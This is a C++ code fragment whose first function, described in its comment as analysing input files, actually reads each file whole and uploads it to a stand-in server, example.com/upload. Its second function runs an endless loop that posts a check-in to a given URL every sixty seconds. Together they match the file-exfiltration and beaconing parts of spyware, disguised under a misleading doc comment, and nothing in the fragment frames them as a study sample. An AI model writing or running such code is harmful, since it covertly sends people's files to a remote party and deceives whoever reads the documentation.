/// <summary>
/// Analyzes input files for data collection via webserver.
/// </summary>
/// <param name="input_files">The array of input file names</param>
/// <param name="file_count">The number of input files</param>
void analyze_files(const char** input_files, int file_count) {
    for (int i = 0; i < file_count; i++) {
        std::ifstream input_file(input_files[i], std::ios::in | std::ios::binary);
        if (!input_file) {
            printf("Failed to open input file %s\n", input_files[i]);
            continue;
        }

        input_file.seekg(0, std::ios::end);
        int file_size = input_file.tellg();
        input_file.seekg(0, std::ios::beg);

        char* buffer = new char[file_size];
        input_file.read(buffer, file_size);
        input_file.close();

        auto response = cpr::Post(cpr::Url{"http://example.com/upload"},
                                cpr::Multipart{{"file", cpr::Buffer{buffer, file_size}, input_files[i]}});
        if (response.status_code != 200) {
            printf("Failed to upload file %s, status code: %d\n", input_files[i], response.status_code);
        } else {
            printf("Successfully uploaded file %s\n", input_files[i]);
        }
        delete[] buffer;
    }
}

/// <summary>
/// Send heartbeat to data collection webhook
/// </summary>
/// <param name="lpParam">URL Parameter</param>
DWORD WINAPI send_heartbeat(LPVOID lpParam) {
    std::string* url = static_cast<std::string*>(lpParam);
    while (true) {
        cpr::Post(cpr::Url{*url});
        Sleep(60000);
    }
    return 0;
}
